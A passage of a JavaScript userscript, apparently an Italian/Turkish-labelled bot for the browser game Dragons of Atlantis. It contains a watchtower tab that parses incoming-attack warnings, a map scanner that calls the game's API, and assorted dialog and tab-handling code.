      if (t.readList.length > 0)
        t.readMsgsTimer = setTimeout (t.readMsgs, 2500);
      else
      {
        if (t.idsToDelete.length>0)
        {
          Ajax.messageDelete (t.idsToDelete);
          t.idsToDelete = [];
        }
        var dial = new ModalDialog (t.cont, 300, 150, '', true);
        dial.getContentDiv().innerHTML = '<B>'+'Fine cancellazione'+'!</b>'; //TODO Translate
        document.getElementById('pbForDelete').innerHTML = '';
      }
    });
  },

  hide : function (){
  },
  show : function (){
  },
}  

/*********************************** Tower Tab ***********************************/
Tabs.Tower = {
  tabOrder : TOWER_TAB_ORDER,
  tabLabel : gTower,
  cont : null,
  logTab : null,
  alarMTimer : null,
  deleteTimer: null,
  maxEntries: 100,
  saveEntries: 100,
  readList : [],
  fetchTimer : null,

  init : function (div){
    var t = Tabs.Tower;
    t.cont = div;
    try {      
      var m = '<DIV class=pbTitle style="margin-bottom:10px">'+translate( 'GOZCU ALARMI' )+'</div><TABLE class=pbTab>\
        <TR valign=top><TD colspan=2><B>'+translate( 'Yapilandirma' )+':</b></td></tr>\
        <TR><TD colspan=2><INPUT id=ptTowerAlert type=checkbox /> '+translate( 'Gozcu Alarmini Aktive Et' )+'</td></tr>\
        <TR><TD colspan=2><INPUT id=ptTowerNoSpy type=checkbox /> '+translate( 'Casuslamalari Gizle' )+'</td></tr>\
        <TR><TD colspan=2><INPUT id=ptTowerSound type=checkbox /> '+translate( 'Sesli Alarma Izin Ver')+'</td></tr>\
        <TR><TD colspan=2>'+translate( 'Check alarm every')+': <INPUT id=ptTowerCheckTime size=1 maxlength=2 type=text value="'+ Data.options.warningTower.delay +'" /></td><TD>\
        <SELECT id=ptTowerCheckUnit size=1>\
          <OPTION value=1 '+(Data.options.warningTower.unit == 1 ? 'selected' : '')+'>'+translate( 'Saniye' )+'</option>\
          <OPTION value=60 '+(Data.options.warningTower.unit == 60 ? 'selected' : '')+'>'+translate( 'Dakika' )+'</option>\
          <OPTION value=3600 '+(Data.options.warningTower.unit == 3600 ? 'selected' : '')+'>'+translate( 'Saat' )+'</option>\
        </select></td></tr>';
      m += '<TR><TD><INPUT id=ptTowerDelete type=checkbox /> '+translate( 'Alarmi Sil Bu Kdar Sonra :')+': <INPUT id=ptTowerDeleteTime size=1 maxlength=2 type=text value="'+ Data.options.warningTower.delayDelete +'" /></td><TD>\
        <SELECT id=ptTowerDeleteUnit size=1>\
          <OPTION value=60 '+(Data.options.warningTower.unitDelete == 60 ? 'selected' : '')+'>'+translate( 'Dakika' )+'</option>\
          <OPTION value=3600 '+(Data.options.warningTower.unitDelete == 3600 ? 'selected' : '')+'>'+translate( 'Saat' )+'</option>\
          <OPTION value=86400 '+(Data.options.warningTower.unitDelete == 86400 ? 'selected' : '')+'>'+translate( 'Gun' )+'</option>\
        </select></td></tr>';
      m += '</table><BR><HR>';
      m += '<DIV class=pbTitle>'+translate('ALARM LOG')+'</div><DIV style="height:675px; max-height:675px; overflow-y:auto">\
        <TABLE cellpadding=0 cellspacing=0 id=ptTowerLog width=100%></table></div>';
      t.cont.innerHTML = m;
      t.logTab = document.getElementById('ptTowerLog');
      Data.msgsTower = [];
      t.printTab();  
      t.togOpt ('ptTowerAlert', Data.options.warningTower.enabled, t.setEnable);
      t.togOpt ('ptTowerNoSpy', Data.options.warningTower.nospy, t.setEnableNoSpy);
      t.togOpt ('ptTowerSound', Data.options.warningTower.sound, t.setEnableSound);
      t.togOpt ('ptTowerDelete', Data.options.warningTower.deleteReport, t.setDeleteReport);
      document.getElementById('ptTowerCheckTime').addEventListener ('change', t.timeChanged, false);
      document.getElementById('ptTowerCheckUnit').addEventListener ('change', t.unitChanged, false);
      document.getElementById('ptTowerDeleteTime').addEventListener ('change', t.timeDeleteChanged, false);
      document.getElementById('ptTowerDeleteUnit').addEventListener ('change', t.unitDeleteChanged, false);
      t.deleteTick();
      t.alarMTick();
    } catch (e) {
      t.cont.innerHTML = '<PRE>'+ e.name +' : '+ e.message +'</pre>';  
    }
  },
 
  printTab : function ()
  {
    var t = Tabs.Tower;
    t.logTab.innerHTML = '';
    t._addTab ('', true);
    if (matTypeof(Data.msgsTower) == 'array'){
      for (var i=0; i<Data.msgsTower.length; i++)
        t._addTab (Data.msgsTower[i], false);
    }
  },
 
  _addTab : function (msg, head){
    var t = Tabs.Tower;
    
    if (!head && Data.options.warningTower.nospy)
    {
      if (msg.type == 1)
        return;
    }

    var rows = t.logTab.getElementsByTagName('tr');
    var rowCount = rows.length;
    var row = t.logTab.insertRow((head==true? 0 : 1));

    row.vAlign = 'top';
    if (head) //Intestazione
    {
      row.style.backgroundColor = "Navy";
      row.id = 0;
    }
    else
    {
      if (rowCount % 2 == 1)
        row.style.backgroundColor = "White";
      else
        row.style.backgroundColor = "Aqua";
      row.id = msg.id;
    }

    var cell;
    var txt;
    for (var i=0;i<5;i++)
    {
      cell = row.insertCell(i);
      if (head) //Intestazione
      {
        if (i==0)
          txt = translate( 'Tip ' );
        else if (i==1)
          txt = translate( 'Ayrilis Saati ' );
        else if (i==2)
          txt = translate( 'Saldiran ' );
        else if (i==3)
          txt = translate( 'Ittifak ' );
        else
          txt = translate( 'Askerler' );
      }
      else
      {
        if (i==0)
          txt = (msg.type == 0 ? translate( 'Savaş' ) : translate( 'Tip-Off' ));
        else if (i==1)
        {
          if (msg.arrive_at != 0)
            txt = new Date(msg.arrive_at).formatTime() + ' del ' +new Date(msg.arrive_at).formatDate();
          else
            txt = '';
        }
        else if (i==2)
        {
          if (msg.x != -1)
            txt = msg.x+','+msg.y;
          else
            txt = '';
        }
        else if (i==3)
          txt = msg.alliance;
        else
          txt = msg.troups;
      }

      cell.innerHTML = txt;
      if (i>2)
        cell.width = '30%';
      else if (i==2)
        cell.width = '10%';
      else
        cell.width = '15%';
      if (head) //Intestazione
      {
        cell.style.fontWeight = 'bold';
        cell.style.color = 'White';
      }
      else
      {
        cell.style.fontWeight = 'normal';
        cell.style.color = 'Black';
      }
    }
  }, 

  removeRow : function (msg)
  {
    var t = Tabs.Tower;
    for (var i=0;i<t.logTab.rows.length;i++)
    {
      if (t.logTab.rows[i].id == msg.id)
      {
        t.logTab.deleteRow(i);
        break;
      }
    }
  },
    
  // check for alarm reports
  checkAlarm : function (){
    Ajax.messageList ('all', 1, function (rslt){
      var t = Tabs.Tower;
      if (rslt!=null)
      {
  //logit ('messageList:\n' + inspect (rslt, 7, 1));        
        for (var i=rslt.length-1; i>=0; i--){
          if (rslt[i].report_type=="SentinelWarning"){
            var found = false;
            for (var j=0;j<Data.msgsTower.length;j++)
            {
              if (Data.msgsTower[j].id==rslt[i].id)
              {
                found = true;
                break;
              }
            }
            if (!found)
              t.readList.push (rslt[i].id);
          }
        }
        clearTimeout (t.fetchTimer);
        if (t.readList.length > 0)
          t.fetchTimer = setTimeout (t.fetchNext, 2000);
      }
    });
  },  
 
  fetchNext : function (){
    var t = Tabs.Tower;
    var id = t.readList[0];
    if (!id){
      logit ('t.readList BAD MESSAGE ID:\n'+ inspect (t.readList, 8, 1));
      return;
    }    
    clearTimeout (t.fetchTimer);
    Ajax.messageDetail (id, function (rslt){
      var t = Tabs.Tower;
      t.gotAlarmReport (rslt, id);
      t.readList.shift();
      if (t.readList.length > 0)
        t.fetchTimer = setTimeout (t.fetchNext, 2500);
    });
  },
  
  gotAlarmReport : function (rpt, msgid){
    var msg = {
      id : msgid,
      type : 0,
      arrive_at : 0,
      alliance : '',
      x : 0,
      y : 0,
      troups : '',
    };

    var msgIndexed;
    var indmax = 4;
    var toAdd = 0;

    if (rpt.report.warnings.length > indmax)
    {
      msgIndexed = rpt.report.warnings[indmax-1]; 
      msg.arrive_at = getValueFromString(msgIndexed, indmax-1, 0, toAdd);
      var d = Date.parse(msg.arrive_at)/1000;
      if (parseInt(serverTime())-d>=Data.options.warningTower.delayDelete*Data.options.warningTower.unitDelete)
        return;
      indmax += 2;
    }
    if (rpt.report.warnings.length > indmax)
    {
      msgIndexed = rpt.report.warnings[indmax-1]; 
      msg.alliance = getValueFromString(msgIndexed, indmax-1, 0, toAdd);
      indmax++;
    }
    if (rpt.report.warnings.length > indmax)
    {
      if (rpt.report.warnings[indmax-1].indexOf('General') >= 0)
      {
        toAdd = 1;
        indmax++;
      }
      else
        msg.type = 1;
    }
    if (rpt.report.warnings.length > indmax)
    {
      msgIndexed = rpt.report.warnings[indmax-1]; 
      msg.x = getValueFromString(msgIndexed, indmax-1, 0, toAdd);
      msg.y = getValueFromString(msgIndexed, indmax-1, 1, toAdd);
      indmax++;
    }
    if (rpt.report.warnings.length > indmax)
    {
      msgIndexed = rpt.report.warnings[indmax-1]; 
      msg.troups = getValueFromString(msgIndexed, indmax-1, 0, toAdd);
    }
    
    function getValueFromString(warn, ind, value, toAdd)
    {
      var str = warn;
      var toSearch;
      var ritorno;
      var t = Tabs.Tower;

      if (ind == 3) //ora d'arrivo
        toSearch = ' arrive by ';
      else if (ind == 5) //alleanza
        toSearch = ' member of ';
      else if (ind == 6) //x e y
        toSearch = ' originate from ';
      else if (ind == 7)
      {
        if (toAdd == 1) //x e y
          toSearch = ' originate from ';
        else //truppe
          toSearch = ' include ';
      }
      else //truppe
        toSearch = ' include ';

      pos = str.indexOf(toSearch);
      if (pos < 0)
      {
        if (ind == 3) //ora d'arrivo
          result = 0;
        else if (ind == 5) //alleanza
          result = '';
        else if (ind == 6) //x e y
          result = -1;
        else if (ind == 7)
        {
          if (toAdd == 1) //x e y
            result = -1;
          else //truppe
            result = '';
        }
        else //truppe
          result = '';

        return result;
      }

      var strNew = str.substr(pos+toSearch.length);
      if (strNew.substr(strNew.length-1) == '.')
        strNew = strNew.substr(0, strNew.length-1);

      if (ind == 3) //ora d'arrivo
        result = t.getTimeAlarm(strNew);
      else if (ind == 5) //alleanza
        result = strNew;
      else if (ind == 6) //x e y
        result = t.getCoordXY(strNew, value);
      else if (ind == 7)
      {
        if (toAdd == 1) //x e y
          result = t.getCoordXY(strNew, value);
        else //truppe
          result = t.getTroups(strNew);
      }
      else //truppe
        result = t.getTroups(strNew);

      return result;
    }

    Data.msgsTower.push (msg);
    var t = Tabs.Tower;
    t._addTab (msg, false);
  },
  
  getTroups : function (str)
  {
    var result = '';
    var pos;
    var splitRes = str.split(", ");

    for (var i=splitRes.length-1;i>=0;i--)
    {
      pos = splitRes[i].indexOf(' ');
      if (pos < 0)
        splitRes.splice(i,1);
      else
        splitRes[i] = splitRes[i].substr(0,pos) + ' ' +translate ( splitRes[i].substr(pos+1) ); 
    }
    
    if (splitRes.length>0)
      result = splitRes.join(', ');

    return result;
  },
  
  getTimeAlarm : function (str)
  {
    var result = 0;

    if (str.length>=19)
    {
      var year;
      var month;
      var day;
      var hours;
      var minutes;
      var seconds;

      year = parseInt(str.substr(0,4));
      month = parseInt(str.substr(5,2));
      if (month==0)
        month = parseInt(str.substr(6,1));
      day = parseInt(str.substr(8,2));
      if (day==0)
        day = parseInt(str.substr(9,1));
      hours = parseInt(str.substr(11,2));
      if (hours==0)
        hours = parseInt(str.substr(12,1));
      minutes = parseInt(str.substr(14,2));
      if (minutes==0)
        minutes = parseInt(str.substr(15,1));
      seconds = parseInt(str.substr(17,2));
      if (seconds==0)
        seconds = parseInt(str.substr(18,1));

      result = new Date(Date.UTC(year, month-1, day, hours, minutes, seconds));
    }

    return result;
  },

  getCoordXY : function (str, value)
  {
    var pos;
    var result = -1;

    pos = str.indexOf('/');
    if (pos >= 0)
      result = (value==0?parseInt(str.substr(0, pos)):parseInt(str.substr(pos+1)));

    return result;
  },

  alarMTick : function (){
    var t = Tabs.Tower;
    clearTimeout (t.alarMTimer);
    t.checkAlarm();
    t.alarMTimer = setTimeout (t.alarMTick, Data.options.warningTower.delay*Data.options.warningTower.unit*1000);
  },

  deleteTick : function (){
    var t = Tabs.Tower;
    clearTimeout (t.deleteTimer);
    if (Data.options.warningTower.deleteReport)
    {
      var d;
      //Cancella allarmi scaduti
      for (var i=Data.msgsTower.length-1;i>=0;i--)
      {
        d = Date.parse(Data.msgsTower[i].arrive_at)/1000;
        if (parseInt(serverTime())-d>=Data.options.warningTower.delayDelete*Data.options.warningTower.unitDelete)
        {
          t.removeRow(Data.msgsTower[i]);
          Data.msgsTower.splice(i,1);
        }
      }
      t.deleteTimer = setTimeout (t.deleteTick, Data.options.warningTower.delayDelete*Data.options.warningTower.unitDelete*1000);
    }
  },

  setEnable : function (onOff){
    var t = Tabs.Tower;
    Data.options.warningTower.enabled = onOff;
    t.alarMTick();
  },
  
  setEnableNoSpy : function (onOff){
    var t = Tabs.Tower;
    Data.options.warningTower.nospy = onOff;
    t.printTab();
  },
  
  setEnableSound : function (onOff){
    Data.options.warningTower.sound = onOff;
  },

  setDeleteReport : function (onOff){
    var t = Tabs.Tower;
    Data.options.warningTower.deleteReport = onOff;
    t.deleteTick();
  },

  timeChanged : function (e){
    var t = Tabs.Tower;
    var etime = document.getElementById('ptTowerCheckTime');
    var time = parseIntZero (etime.value);
    etime.value = time;
    Data.options.warningTower.delay = time;
    t.alarMTick();
  },
  
  unitChanged : function (e){
    var t = Tabs.Tower;
    var eunit = document.getElementById('ptTowerCheckUnit');
    var unit = parseIntZero (eunit.value);
    eunit.value = unit;
    Data.options.warningTower.unit = unit;
    t.alarMTick();
  },
  
  timeDeleteChanged : function (e){
    var t = Tabs.Tower;
    var etime = document.getElementById('ptTowerDeleteTime');
    var time = parseIntZero (etime.value);
    etime.value = time;
    Data.options.warningTower.delayDelete = time;
    t.deleteTick();
  },
 
  unitDeleteChanged : function (e){
    var t = Tabs.Tower;
    var eunit = document.getElementById('ptTowerDeleteUnit');
    var unit = parseIntZero (eunit.value);
    eunit.value = unit;
    Data.options.warningTower.unitDelete = unit;
    t.deleteTick();
  },
  
  hide : function (){
  },
  show : function (){
  },
  
  togOpt : function (checkboxId, optionVar, callEnable, callIsAvailable){
    var t = Tabs.Tower;
    var checkbox = document.getElementById(checkboxId);
    
    if (callIsAvailable && callIsAvailable()==false){
      checkbox.disabled = true;
      return;
    }
    if (optionVar)
      checkbox.checked = true;
    checkbox.addEventListener ('change', new eventToggle(checkboxId, optionVar, callEnable).handler, false);
    function eventToggle (checkboxId, optionVar, callOnChange){
      this.handler = handler;
      var optVar = optionVar;
      var callback = callOnChange;
      function handler(event){
        optVar = this.checked;
        if (callback != null)
          callback (this.checked);
      }
    }
  },
}

/*********************************************************************************/

/***
callback (datObj):
  minX
  minY
  maxX
  maxY
  done: true/false
  tiles [  {x, y, type, dist, lvl, detail{} } ]  type = A, W or C
***/

var Map = {
  names : {
    A : 'AntCamp',
    C : 'City',
    O : 'Outpost',
    H : 'Hill',
    G : 'Grassland',
    L : 'Lake',
    M : 'Mountain',
    F : 'Forest',
    P : 'Plain',
    S : 'Swamp',
  },
  scanMapCirc : function (x, y, radius, callback, doDetail){
    var t = Map;
    t.centerX = x;
    t.centerY = y;
    t.firstX = t.normalize (x-radius+7);
    t.firstY =  t.normalize (y-radius+7);
    t.curIX = t.curIY = 0;
    t.widthI = parseInt(((radius*2)+14)/15); 
    t.radius = radius;
    t.doDetail = doDetail;
    t.callback = callback; 
    t.circ = true;
//WinLog.writeText ('***** AJAX: '+ t.curX +' , '+ t.curY);    
    new MyAjaxRequest ('map.json', { 'user%5Fid':C.attrs.user_id, x:t.firstX, y:t.firstY, timestamp:parseInt(serverTime()), '%5Fsession%5Fid':C.attrs.session_id, 'dragon%5Fheart':C.attrs.dragon_heart, version:12 }, t.got, false);
  },  

  got : function (rslt){
    var t = Map;
    var x = rslt.dat.x;
    var ret = {tiles:[]}
//logit ('Map.got:\n'+ inspect (rslt.dat, 1, 1));    
    if (!rslt.ok){
      t.callback (null);    // error !?!
      return;
    }
    for (var i=0; i<rslt.dat.terrain.length; i++){
      for (var ii=0; ii<rslt.dat.terrain[i].length; ii++){
        var tile = rslt.dat.terrain[i][ii];
        var dist = distance (t.centerX, t.centerY, tile[2], tile[3]);
        if (dist <= t.radius){
          var type = tile[0].substr(0,1).toUpperCase();
          var d = {x:tile[2], y:tile[3], dist:dist, type:type, lvl:tile[1]};
  // TODO:  detail  
          if (t.doDetail){
             if (type=='W'){
             } else if (type=='C') {
             }
          }
          ret.tiles.push (d);
        }
      }
    }
//logit ('SCAN 1:\n'+ inspect (t, 5, 1));    
    if (++t.curIX >= t.widthI){
      t.curIX = 0;
      if (++t.curIY >= t.widthI){
        ret.done = true;
        t.callback (ret); 
        return;
      }
    }
//logit ('SCAN 2:\n'+ inspect (t, 5, 1));    
    ret.done = false;
    t.callback (ret);  
//WinLog.writeText ('***** AJAX: '+ t.curX +' , '+ t.curY);    
    setTimeout (function(){new MyAjaxRequest ('map.json', { 'user%5Fid':C.attrs.user_id, x:t.normalize(t.firstX+(t.curIX*15)), y:t.normalize(t.firstY+(t.curIY*15)), timestamp:parseInt(serverTime()), '%5Fsession%5Fid':C.attrs.session_id, 'dragon%5Fheart':C.attrs.dragon_heart, version:12 }, t.got, false);}, MAP_DELAY);
 },
    
  normalize : function (x){
    if (x > 750)
      x -= 750;
    if (x < 0)
      x += 750;
    return x;
  },  
}




// CLASS!
function ModalDialog (curtainDiv, width, height, styleName, allowClose, notifyClose){
  this.allowClose = function (onOff){
    if (onOff)
      document.getElementById('Tıp7r8h').style.display = 'block';
     else
      document.getElementById('Tıp7r8h').style.display = 'none';
  }
  this.destroy = function (){
    if (!this.destroyed){
      this.curtainDiv.removeChild(this.curtain);
      this.curtainDiv.removeChild(this.div);
    }
  }
  this.hide = function (){
      this.curtainDiv.style.display='none';
      this.curtainDiv.style.display='none';
  }
  this.show = function (){
      this.curtainDiv.style.display='block';
      this.curtainDiv.style.display='block';
  }
  
  this.getContentDiv = function (){
    return document.getElementById('Tıp7r8hc');
  }
  
  var off = getAbsoluteOffsets (curtainDiv);
  this.curtainDiv = curtainDiv;
  this.curtain = document.createElement ('div');
  this.curtain.style.top = off.top +'px';
  this.curtain.style.left = off.left + 'px';
  this.curtain.style.width = curtainDiv.clientWidth +'px';
  this.curtain.style.height = curtainDiv.clientHeight +'px';
  this.curtain.style.backgroundColor = '#000';
  this.curtain.style.opacity = '0.6';
  this.curtain.style.zIndex = parseInt(curtainDiv.style.zIndex) + 1;
  this.curtain.style.position = 'absolute';
//  curtain.style.margin = curtainDiv.style.margin;
//  curtain.style.padding = curtainDiv.style.padding;
  curtainDiv.appendChild (this.curtain);

  this.div = document.createElement('div');
  if (styleName)
    this.div.className = styleName;
  else {
    this.div.style.backgroundColor = '#FCDC26';
    this.div.style.border = '1px solid black';
  }
  this.div.style.width = width +'px';
  this.div.style.height = height +'px';
  this.div.style.position = 'absolute';
  this.div.style.zindex = parseInt(curtainDiv.style.zIndex) + 2;
  this.div.style.top = ((curtainDiv.clientHeight-height)/2 + off.top) + 'px';
  this.div.style.left = ((curtainDiv.clientWidth-width)/2 + off.left +1) + 'px';

    //TODO Translate
  this.div.innerHTML = '<TABLE HEIGHT=100% WIDTH=100%><TR valign=middle height=80%><TD><DIV id=Tıp7r8hc style="text-align:center"></div></td></tr>\
    <TR valign=middle align=center><TD><INPUT id=Tıp7r8h type=submit value="CHIUDI" style="display:none"/></td></tr></table>';
  curtainDiv.appendChild(this.div);
  this.allowClose(allowClose);
  this.notifyClose = notifyClose;
  var t = this;
  document.getElementById('Tıp7r8h').addEventListener('click', function (){
      t.destroyed = true;
      t.curtainDiv.removeChild(t.curtain);
      t.curtainDiv.removeChild(t.div);
      if (t.notifyClose)
        notifyClose();
  }, false);
}


function addScript (scriptText){
    var scr = document.createElement('script');   
    scr.innerHTML = scriptText;
    document.body.appendChild(scr);
//    setTimeout ( function (){document.body.removeChild(scr);}, 500);
}


function distance (d, f, c, e) {
  var a = 750;
  var g = a / 2;
  var b = Math.abs(c - d);
  if (b > g)
    b = a - b;
  var h = Math.abs(e - f);
  if (h > g)
    h = a - h;
  return Math.round(100 * Math.sqrt(b * b + h * h)) / 100;
};


var tabManager = {
  tabList : {},           // {name, obj, div}
  currentTab : null,
  
  init : function (mainDiv){
    var t = tabManager;
    var sorter = [];
    for (k in Tabs){
      if (!Tabs[k].tabDisabled){  
        t.tabList[k] = {};
        t.tabList[k].name = k;
        t.tabList[k].obj = Tabs[k];
        if (Tabs[k].tabLabel != null)
          t.tabList[k].label = Tabs[k].tabLabel;
        else
          t.tabList[k].label = k;
        if (Tabs[k].tabOrder != null)
          sorter.push([Tabs[k].tabOrder, t.tabList[k]]);
        else
          sorter.push([1000, t.tabList[k]]);
        t.tabList[k].div = document.createElement('div');
      }
    }

    sorter.sort (function (a,b){return a[0]-b[0]});
    var m = '<TABLE cellspacing=0 class=pbMainTab><TR>';
    fuck = makeid();
    for (var i=0; i<sorter.length; i++)
      m += '<TD class=spacer></td><TD class=notSel id='+ fuck+sorter[i][1].name +' ><A><SPAN>'+ sorter[i][1].label +'</span></a></td>';
    m += '<TD class=spacer width=90% align=center><FONT COLOR=#FFFFFF>v '+VersionC+'</font></td></tr></table>';
    mainPop.getTopDiv().innerHTML = m;
    
    t.currentTab = null;
    for (k in t.tabList) {
      if (t.tabList[k].name == Data.options.currentTab)
        t.currentTab = t.tabList[k] ;
      document.getElementById(fuck+ k).addEventListener('click', this.e_clickedTab, false);
      var div = t.tabList[k].div; 
      div.style.display = 'none';
      div.style.height = '100%';
      div.style.maxWidth = 'auto';
      div.style.overflowX = 'auto';
      mainDiv.appendChild(div);
      try {
        t.tabList[k].obj.init(div);
      } catch (e){
        div.innerHTML = "INIT ERROR: "+ e;
      }
    }
    if (t.currentTab == null)
      t.currentTab = sorter[0][1];    
    t.setTabStyle (document.getElementById (fuck+ t.currentTab.name), true);
    t.currentTab.div.style.display = 'block';
  },
  
  hideTab : function (){
    var t = tabManager;
    t.currentTab.obj.hide();
  },
  
  showTab : function (){
    var t = tabManager;
    t.currentTab.obj.show();
  },
    
  setTabStyle : function (e, selected){
    if (selected){
      e.className = 'sel';
    } else {
      e.className = 'notSel';
    }
  },
  
  e_clickedTab : function (e){
    var t = tabManager;
    var newTab = t.tabList[e.target.parentNode.parentNode.id.substring(fuck.length)];
    if (t.currentTab.name != newTab.name){
      t.setTabStyle (document.getElementById (fuck+ newTab.name), true);
      t.setTabStyle (document.getElementById (fuck+ t.currentTab.name), false);
      t.currentTab.obj.hide ();
      t.currentTab.div.style.display = 'none';
      t.currentTab = newTab;
      newTab.div.style.display = 'block';
      Data.options.currentTab = newTab.name;      
    }
    newTab.obj.show();
  },
}


function setTabStyle (e, selected){
  if (selected){
    e.className = 'matTabSel';
  } else {
    e.className = 'matTabNotSel';
  }
}

function clickedTab (e){
  who = e.target.id.substring(2);
  newObj = my[who];
  currentObj = my[currentName];
  if (currentName != who){
    setTabStyle (document.getElementById ('aa'+currentName), false);
    setTabStyle (document.getElementById ('aa'+who), true);
    if (currentObj){
      currentObj.hide ();
      currentObj.getContent().style.display = 'none';
    }
    currentName = who;
    cont = newObj.getContent();
    newObj.getContent().style.display = 'block';
  }
  newObj.show();
}

function mouseMainTab (me){
  if (me.button == 2){
    var c = getClientCoords (document.getElementById('main_engagement_tabs'));
    mainPop.setLocation ({x: c.x+4, y: c.y+c.height});
    showMe();
  }
}

function eventHideShow (e){
  if (Data.options.ptWinIsOpen)
    hideMe();
  else 
    showMe();
}

function hideMe (){
  if (!Data.options.ptWinIsOpen)
    return;
  WinTracker.show(false);
  tabManager.hideTab();
}
function showMe (){
  if (Data.options.ptWinIsOpen)
    return;
  WinTracker.show(true);
  tabManager.showTab();
}



// onClick (city{name, id, x, y}, x, y)   city may be null!
function CdispCityPicker (id, span, dispName, notify, selbut){
  function CcityButHandler (t){
    var that = t;
    this.clickedCityBut = clickedCityBut;
    function clickedCityBut (e){
      if (that.selected != null)
        that.selected.className = "ptcastleBut ptcastleButNon";
      that.city = Cities.cities[e.target.id.substr(that.prefixLen)];
      if (that.dispName)
        document.getElementById(that.id+'cname').innerHTML = that.city.name;
      e.target.className = "ptcastleBut ptcastleButSel";
      that.selected = e.target;
      if (that.coordBoxX){
        that.coordBoxX.value = that.city.x;
        that.coordBoxY.value = that.city.y;
        that.coordBoxX.style.backgroundColor = '#ffffff';
        that.coordBoxY.style.backgroundColor = '#ffffff';
      }
      if (that.notify != null)
        that.notify(that.city, that.city.x, that.city.y);
    }
  }

  function selectBut (idx){
    document.getElementById(this.id+'_'+idx).click();
  }

  function bindToXYboxes (eX, eY){
    function CboxHandler (t){
      var that = t;
      this.eventChange = eventChange;
      if (that.city){
        eX.value = that.city.x;
        eY.value = that.city.y;
      }
      function eventChange (){
        var x = parseInt(that.coordBoxX.value, 10);
        var y = parseInt(that.coordBoxY.value, 10);
        if (isNaN(x) || x<0 || x>750){
          that.coordBoxX.style.backgroundColor = '#ff8888';
          return;
        }
        if (isNaN(y) || y<0 || y>750){
          that.coordBoxY.style.backgroundColor = '#ff8888';
          return;
        }
        that.coordBoxX.style.backgroundColor = '#ffffff';
        that.coordBoxY.style.backgroundColor = '#ffffff';
        if (that.notify != null)
          that.notify (null, x, y);
      }
    }
    this.coordBoxX = eX;
    this.coordBoxY = eY;
    var bh = new CboxHandler(this);
    eX.size=2;
    eX.maxLength=3;
    eY.size=2;
    eY.maxLength=3;
    eX.addEventListener('change', bh.eventChange, false);
    eY.addEventListener('change', bh.eventChange, false);
  }

  this.selectBut = selectBut;
  this.bindToXYboxes = bindToXYboxes;
  this.coordBoxX = null;
  this.coordBoxY = null;
  this.id = id;
  this.dispName = dispName;
  this.prefixLen = id.length+1;
  this.notify = notify;
  this.selected = null;
  this.city = null;
  var m = '';
  for (var i=0; i<Cities.cities.length; i++)
    m += '<INPUT class="ptcastleBut ptcastleButNon" id="'+ id +'_'+ i +'" value="'+ (i+1) +'" type=submit \>';
  if (dispName)
    m += '    <SPAN style="display:inline-block; width:85px; font-weight:bold;" id='+ id +'cname' +'></span>';
  span.innerHTML = m;
  var handler = new CcityButHandler(this);
  for (var i=0; i<Cities.cities.length; i++)
    document.getElementById (id+'_'+i).addEventListener('click', handler.clickedCityBut, false);
  if (selbut != null)
    this.selectBut(selbut);
};


function CdialogCancelContinue (msg, canNotify, contNotify, centerElement){
  var pop = new CPopuppa ('ptcancont', 0, 0, 401,200, true, canNotify);
  if (centerElement)
    pop.centerMe(centerElement);
  else
    pop.centerMe(document.body);
  pop.getTopDiv().innerHTML = '<CENTER><FONT COLOR=#FFFFFF>DoA Bot Italiano</center>';
  pop.getMainDiv().innerHTML = '<TABLE class=ptTab align=center style="height: 100%"><TR height=90%><TD align=center>'+ msg +'</td></tr>\
      <TR><TD align=center><INPUT id=ptcccancel type=submit value="CANCEL" \>       <INPUT id=ptcccontin type=submit value="CONTINUE" \></td></tr></table>';
  document.getElementById('ptcccancel').addEventListener ('click', function (){pop.show(false); if (canNotify) canNotify();}, false);
  document.getElementById('ptcccontin').addEventListener ('click', function (){pop.show(false); if (contNotify) contNotify();}, false);
  pop.show(true);
}


// TODO: add 'Retry Now' button
function DialogRetry (errMsg, seconds, onRetry, onCancel){
  var secs;
  var pop;
  var rTimer;
  var cdTimer;
  
    secs = parseInt(seconds);
    pop = new CPopuppa ('pbretry', 0, 0, 401,250, true);
    pop.centerMe(mainPop.getMainDiv());
    pop.getTopDiv().innerHTML = '<CENTER><FONT COLOR=#FFFFFF>ProEkipWNA</center>';
    pop.getMainDiv().innerHTML = '<CENTER><BR><FONT COLOR=#FF0000><B>Hata:</b></font><BR><BR><DIV id=paretryErrMsg></div>\
        <BR><BR><B>TGE Tools Otomatik Yeniden Deneme		<SPAN id=paretrySeconds></b></span> Saniye<BR><BR><INPUT id=paretryCancel type=submit value="Yenilemeyi Kapat" \>'; // TODO: Translate
    document.getElementById('paretryCancel').addEventListener ('click', doCancel, false);
    pop.show(true);
    document.getElementById('paretryErrMsg').innerHTML = errMsg;
    document.getElementById('paretrySeconds').innerHTML = secs;
    rTimer = setTimeout (doRetry, secs*1000);
    cdTimer = null;
    countdown ();

  function countdown (){
    document.getElementById('paretrySeconds').innerHTML = secs--;
    if (secs > 0)
      cdTimer = setTimeout (countdown, 1000);
  }
  function doCancel(){
    clearTimeout (rTimer);
    clearTimeout (cdTimer);
    pop.destroy();
    onCancel ();
  }
  function doRetry (){
    clearTimeout (rTimer);
    clearTimeout (cdTimer);
    pop.show(false);
    onRetry();
  }
}


function implodeUrlArgs (obj){
  var a = [];
  for (var k in obj)
    a.push (k +'='+ encodeURI(obj[k]) );
  return a.join ('&');    
}

// NOTE: args can be either a string which will be appended as is to url or an object of name->values
function addUrlArgs (url, args){
  if (!args)
    return url;
  if (url.indexOf('?') < 0)
    url += '?';
  else if (url.substr(url.length-1) != '&')
    url += '&';    
  if (matTypeof(args == 'object'))
    return url + implodeUrlArgs (args);    
  return url + args;
}

/***
  url: just the path part (ie: map.json or //marches.json)
  params: {}
  callback is passed json obj:  {ok:boolean, errmsg:'', dat:{}}
***/
function MyAjaxRequest (url, params, callback, isPost){
  var o = {onSuccess:mySuccess, onFailure:myFailure};
  var retrySecs = 3.33;
  o.parameters = {};
  for (var p in params)
    o.parameters[p] = params[p];
  //o.parameters._session_id = C.attrs.session_id;
  if (EMULATE_NET_ERROR > 0){
    if (Math.random()*100 <= EMULATE_NET_ERROR){
//      o.parameters._session_id = 'xxx';
      setTimeout (function(){error (999, 'ERROR: Emulated')}, 1500);
      return;
    }
  }

  if (isPost)
    o.method = 'POST';
  o.timeoutSecs = 45;
  if (DEBUG_TRACE_AJAX > 0){
    WinLog.writeText ("AJAX "+ (isPost?'POST':'GET') +" : "+ C.attrs.api_server +'/'+ url);  
    if (DEBUG_TRACE_AJAX > 1)
      WinLog.writeText ('ARGS:\n'+ inspect (o.parameters, 5, 1));
  }
  var ajax = new AjaxRequest (C.attrs.api_server +'/'+ url, o);
  function mySuccess (r){
